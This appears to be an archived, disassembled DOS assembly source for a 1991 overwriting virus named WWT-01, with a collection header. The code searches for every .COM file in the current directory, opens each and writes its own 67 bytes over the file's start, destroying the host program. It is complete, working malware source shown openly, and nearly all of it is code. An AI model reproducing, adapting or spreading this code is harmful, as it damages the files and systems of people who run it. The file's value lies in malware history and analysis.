; ------------------------------------------------------------
; name      W
; type      asm
; cve       —
; year      unknown
; os        DOS
; authors   unknown
; source    krisyotam
; archived  krisyotam (2026)
; notes     —
; ------------------------------------------------------------

PAGE  59,132

;��������������������������������������������������������������������������
;��								         ��
;��			        WWT-01				         ��
;��								         ��
;��      Created:   15-Mar-91					         ��
;��      Passes:    5	       Analysis Options on: none	         ��
;��								         ��
;��������������������������������������������������������������������������

data_009E_e	equ	9Eh

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

wwt-01		proc	far

start:
		mov	dx,offset data_013D
		mov	ah,4Eh			; 'N'
		mov	cx,1
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jnc	loc_010E		; Jump if carry=0
		jmp	short loc_012C
loc_010E:
		mov	dx,data_009E_e
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jnc	loc_011A		; Jump if carry=0
		jmp	short loc_012C
loc_011A:
		mov	bx,ax
		call	sub_012E
		mov	dx,80h
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_012A		; Jump if carry=0
		jmp	short loc_012C
loc_012A:
		jmp	short loc_010E
loc_012C:
		int	20h			; DOS program terminate

wwt-01		endp

;��������������������������������������������������������������������������
;			       SUBROUTINE
;��������������������������������������������������������������������������

sub_012E	proc	near
		mov	dx,100h
		mov	ah,40h			; '@'
		mov	cx,43h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		retn
sub_012E	endp

data_013D	db	2Ah
		db	 2Eh, 43h, 4Fh, 4Dh, 00h

seg_a		ends



		end	start
